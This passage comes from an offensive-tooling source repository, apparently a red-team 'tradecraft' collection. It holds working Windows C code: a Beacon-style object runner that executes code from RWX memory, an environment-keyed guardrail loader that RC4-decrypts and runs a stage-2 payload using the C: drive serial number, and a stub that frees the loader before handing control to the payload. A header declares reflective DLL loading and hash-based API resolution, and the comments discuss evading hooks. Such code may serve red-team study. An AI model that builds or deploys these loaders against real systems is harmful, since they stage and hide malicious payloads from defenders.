 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

void BeaconOutput(int type, char * data, int len);

/*
 * This is IMPORTFUNCS with one other entry. We use this struct to pass function pointers to a
 * PICO using the import command in our Crystal Palace .spec file.
 */
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
	__typeof__(BeaconOutput)   * BeaconOutput;
} BOFIMPORTS;

typedef void (*BOFMAIN)(char * args, int len);

/*
 * This is our BOF runner...
 */
void run_bof(char * src, char * args, int alen) {
	BOFIMPORTS    funcs;
	char        * dstCode;
	char        * dstData;

	/* setup our IMPORTFUNCS data structure (with one additional entry) */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;
	funcs.BeaconOutput   = BeaconOutput;

	/* allocate memory for our PICO */
	dstCode = KERNEL32$VirtualAlloc( NULL, PicoCodeSize(src), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );
	dstData = KERNEL32$VirtualAlloc( NULL, PicoDataSize(src), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE );

	/* load our pico into our destination address, thanks! */
	PicoLoad((IMPORTFUNCS *)&funcs, src, dstCode, dstData);

	/* execute our pico */
	((BOFMAIN)PicoEntryPoint(src, dstCode)) (args, alen);
}

/*
 * This is the one piece of the Beacon API we need to define. Everything else is merged into the BOF by
 * Crystal Palace. Any output is (eventually) passed through this function.
 */
void BeaconOutput(int type, char * data, int len) {
	dprintf("BeaconOut[%x]: %s", type, data);
}

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __BOFDATA__[0] __attribute__((section("my_data")));

/*
 * The entry point to our little BOF runner...
 */
void go() {
	run_bof((char *)__BOFDATA__, NULL, 0);
}

```

## File: simple_bof/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_guardrail/guardrail.spec

```text
#
# We're setting up a few PIC programs, so let's consolidate those setup commands here
#
initpic.x86:
	# +gofirst moves go() to position 0 of our PIC, +optimize removes unused code/functions
	make pic +gofirst +optimize

	# bring in our PIC services module from another project.
	run "../simple_pic/services.spec"

	# merge the Tradecraft Garden Library into our PIC
	mergelib "../libtcg/libtcg.x86.zip"

initpic.x64:
	make pic +gofirst +optimize
	run "../simple_pic/services.spec"
	mergelib "../libtcg/libtcg.x64.zip"

#
# Setup our guardrails
#
x86:
	# load the guardrail COFF onto the Crystal Palace program stack
	load "bin/guardrail.x86.o"
		# call the helper label initpic to setup our PIC loader
		.initpic

		# merge in the guardrails implementation module (key derivation, capability decryption)
		load "bin/gr_impl.x86.o"
			merge

		# bring in our freeandrun PIC
		load "bin/free.x86.o"
			# let's initialize this too
			.initpic

			# Let's run the %STAGE2 specification file, presume we get back a PIC blob, and link
			# that to the function go_stage2() within our freeandrun PIC
			run %STAGE2
				linkfunc "_go_stage2"

			# turn the freeandrun PIC + appended package (the result of our next stage) into bytes
			export

			# prepend the Adler32 sum to this data
			prepsum

			# rc4 encrypt our data using CLI/API-passed ENVKEY
			mask "rc4" $ENVKEY

			# prepend the length to our (encrypted) data
			preplen

			# link to the payload section
			link "stage2"

		export

x64:
	load "bin/guardrail.x64.o"
		.initpic

		load "bin/gr_impl.x64.o"
			merge

		load "bin/free.x64.o"
			.initpic

			run %STAGE2
				linkfunc "go_stage2"

			export

			prepsum
			mask "rc4" $ENVKEY
			preplen

			link "stage2"

		export

```

## File: simple_guardrail/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: simple_guardrail/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/guardrail.c -o bin/guardrail.x86.o
	$(CC) -DWIN_X86 $(CFLAGS) -c src/gr_impl.c -o bin/gr_impl.x86.o
	$(CC) -DWIN_X86 $(CFLAGS) -c src/free.c -o bin/free.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/guardrail.c -o bin/guardrail.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/gr_impl.c -o bin/gr_impl.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/free.c -o bin/free.x64.o

clean:
	rm -rf bin

```

## File: simple_guardrail/src/free.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI DECLSPEC_NORETURN VOID WINAPI KERNEL32$ExitThread (DWORD dwExitCode);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualFree (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);

void go_stage2();

void go(char * loader) {
	/* free our loader */
	KERNEL32$VirtualFree(loader, 0, MEM_RELEASE);

	/* call the entry point of our capability */
	go_stage2();

	/* exit the current thread.. else... we return to our free'd() memory and we don't want that. */
	KERNEL32$ExitThread(0);
}

```

## File: simple_guardrail/src/gr_impl.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

/*
 * We're going to rely on an undocumented Win32 function to do the RC4 decrypt
 * https://s3cur3th1ssh1t.github.io/SystemFunction032_Shellcode/
 *
 * OPSEC Note: outside of a VERY size-constrained situation, I would prefer to
 * just have RC4 functions in my code without the overhead and observation
 * (e.g., hooking) opportunity of a (rarely used?) Win32 undocumented function.
 */
typedef struct {
	DWORD  length;
	DWORD  maxlen;
	char * buffer;
} USTRING;

WINBASEAPI LONG WINAPI ADVAPI32$SystemFunction033(USTRING * data, USTRING * key);

/*
 * Derive an environment key using GetVolumeInformationA
 */
WINBASEAPI WINBOOL WINAPI KERNEL32$GetVolumeInformationA (LPCSTR lpRootPathName, LPSTR lpVolumeNameBuffer,
			DWORD nVolumeNameSize, LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength,
			LPDWORD lpFileSystemFlags, LPSTR lpFileSystemNameBuffer, DWORD nFileSystemNameSize);

typedef struct {
	DWORD a;
	DWORD b;
} ENVKEY;

ENVKEY DeriveKeySerialNo() {
	ENVKEY result;

	/* get the volume serial number and copy it to our key buffer */
	DWORD volumeSerialNumber = 0;
	KERNEL32$GetVolumeInformationA("c:\\", NULL, 0, &volumeSerialNumber, NULL, NULL, NULL, 0);

	/* we're going through this gymnastic because rc4 wants at least 40b (5 bytes) to encrypt. */
	result.a = volumeSerialNumber;
	result.b = volumeSerialNumber;

	return result;
}

/*
 * _VERIFY is the result of "prepsum" from loader.spec.
 */
typedef struct {
	DWORD checksum;
	char  value[];
} _VERIFY;

/*
 * We are going to accept a buffer from the parent loader, to give the parent control over
 * how to allocate (and free) the memory for our decryption.
 *
 * char * dst    - the destination where our decrypted payload will live
 *                 (note: we expect this buffer is pre-populated with our ciphertext, we
 *                  decrypt in place)
 * int    len    - the length of our ciphertext. It better be <= the size of dst.
 * int  * outlen - a ptr to a var to populate with the size of the decrypted content.
 *                 This parameter is optional and a NULL value is OK.
 *
 * Returns a pointer to the decrypted VALUE if successful
 * Returns NULL if decryption or verification failed
 */
char * guardrail_decrypt(char * dst, int len, int * outlen) {
	ENVKEY      key;

	USTRING     u_data;
	USTRING     u_key;

	_VERIFY   * hdr;
	int         ddlen;
	int         ddsum;

	/* This is where we bring our environment-derived key into the mix.
	 * Here, we are using the c:\ drive's serial number as a simple key. */
	key = DeriveKeySerialNo();

	/* setup our USTRING data structures for RC4 decrypt */
	u_data.length = len;
	u_data.buffer = dst;

	u_key.length  = sizeof(ENVKEY);
	u_key.buffer  = (char *)&key;

	/* call the System033 function to do an RC4 decrypt */
	ADVAPI32$SystemFunction033(&u_data, &u_key);

	/* now, we need to *verify* our result. */
	hdr  = (_VERIFY *)dst;

	/* decrypted data length */
	ddlen = len - sizeof(DWORD);

	/* store our output length too, if an outptr was provided */
	if (outlen != NULL)
		*outlen = ddlen;

	/* checksum for our decrypted data (adler32sum is from LibTCG) */
	ddsum = adler32sum((unsigned char *)hdr->value, ddlen);

	/* this succeeded if the packed-in and calculcated checksums match */
	if (hdr->checksum == ddsum) {
		return hdr->value;
	}
	else {
		return NULL;
	}
}

```

## File: simple_guardrail/src/guardrail.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualFree (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualProtect (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

/* defined in guardrail.c */
char * guardrail_decrypt(char * buffer, int len, int * outlen);

/* entry point to our free and run PIC, part of our decrypted stage 2 */
typedef void (* FREEANDRUN)(void * loaderStart);

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __STAGE2__[0] __attribute__((section("stage2")));

/*
 * Our reflective loader itself, have fun, go nuts!
 */
void go() {
	_RESOURCE  * stage2; // _RESOURCE is a tcg.h defined [type][value] struct, useful for preplen'd contents
	char       * buffer;
	char       * data;
	DWORD        oldProt;

	/* find our (encrypted) capability appended to this PIC */
	stage2 = (_RESOURCE *)&__STAGE2__;

	/* allocate memory for our encrypted stage 2 */
	buffer = KERNEL32$VirtualAlloc( NULL, stage2->length, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );

	/* copy our (encrypted) stage 2 over to our RW working buffer */
	__movsb((unsigned char *)buffer, (unsigned char *)stage2->value, stage2->length);

	/* run our guardrail function to handle *everything* about the guardrail process. Note that the return
	 * value of this function is a SLICE into the buffer we passed in. It's not a new allocation. */
	data = guardrail_decrypt(buffer, stage2->length, NULL);

	/*
	 * Guadrail decryption FAILED, do something else, or just exit.
	 */
	if (data == NULL) {
		KERNEL32$VirtualFree( buffer, 0, MEM_RELEASE );
		return;
	}

	/*
	 * Guardail decryption SUCCESS, run stage 2!
	 */
	if (!KERNEL32$VirtualProtect(buffer, stage2->length, PAGE_EXECUTE_READ, &oldProt))
		return;

	/* Call our free and run PIC with go() (our position 0) as the argument. It'll call the stage 2 PIC */
	((FREEANDRUN)data)(go);
}

```

## File: simple_guardrail/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_obj/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
